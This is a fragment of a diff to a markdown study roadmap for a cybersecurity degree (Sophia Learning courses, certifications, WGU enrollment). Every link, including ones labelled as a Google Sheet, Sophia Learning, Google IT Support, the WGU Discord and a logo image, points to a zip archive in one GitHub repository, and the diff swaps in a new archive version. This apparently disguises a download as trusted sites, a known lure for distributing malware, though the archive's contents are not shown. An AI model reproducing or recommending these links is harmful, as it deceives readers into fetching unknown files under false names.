+- [ ] Copy the following Tracking [Google Sheet](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
       
 --- BASE COURSES ---
-- Register at [Sophia Learning](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip) and complete the following courses.
+- Register at [Sophia Learning](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip) and complete the following courses.
   - [ ] ENG1002 (SOPH-0030)
   - [ ] PHIL1005 (SOPH-0065)
   - [ ] COMM1002 (SOPH-0024)
@@ -396,13 +396,13 @@ There are numerous strategies available for the degree path, and the one outline
   - [ ] CS1101 (SOPH-0062)
   - [ ] CS1100 (SOPH-0058)
   - [ ] PM1001 (SOPH-0013)
-- Register at [https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip) and complete the following course.
+- Register at [https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip) and complete the following course.
   - [ ] Political Science 102 (SDCM-0042)
   - [ ] Biology 101L (SDCM-0188)
   - [ ] Computer Science 108 (SDCM-0213)
   - [ ] Computer Science 110 (SDCM-0215) 
 - Other Course (Cheapest and most Effective)
-  - [ ] CS1001 ---> Complete this course with [Google IT Support](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+  - [ ] CS1001 ---> Complete this course with [Google IT Support](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
         
 --- CERTIFICATIONS ---
 - Complete the following certifications (You can get more information on each certification by looking at the certification roadmap)
@@ -415,9 +415,9 @@ There are numerous strategies available for the degree path, and the one outline
 
 --- Western Governors University (WGU) ---
 
-<img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip" width="175" alt="WGU-Logo">
+<img src="https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip" width="175" alt="WGU-Logo">
   
 - Transfer your transcripts (High school diploma, Certifications and completed courses at WGU)
-  - Need help? Join the unofficial [WGU discord](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker-Roadmap_v2.7.zip)
+  - Need help? Join the unofficial [WGU discord](https://raw.githubusercontent.com/Srilaxman05/Hacker-Roadmap/main/omniparity/Hacker_Roadmap_2.5-beta.3.zip)
   
 - [ ] **Enroll in WGU and complete the remaining courses** 
